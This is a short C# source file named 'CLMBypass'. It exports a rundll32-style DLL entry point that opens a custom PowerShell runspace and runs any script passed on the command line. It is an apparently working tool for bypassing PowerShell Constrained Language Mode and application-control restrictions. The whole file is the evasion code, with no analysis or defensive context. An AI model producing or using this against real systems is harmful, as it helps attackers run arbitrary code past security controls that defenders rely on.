using System;
using System.Runtime.InteropServices;

namespace CLMBypass
{
    class Program
    {
        [DllExport("Run", CallingConvention = CallingConvention.StdCall)]
        public static void Run(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
        {
            System.Management.Automation.Runspaces.Runspace run = System.Management.Automation.Runspaces.RunspaceFactory.CreateRunspace();
            run.Open();

            System.Management.Automation.PowerShell shell = System.Management.Automation.PowerShell.Create();
            shell.Runspace = run;

            shell.AddScript(lpszCmdLine);
            shell.Invoke();

            run.Close();
        }
    }
}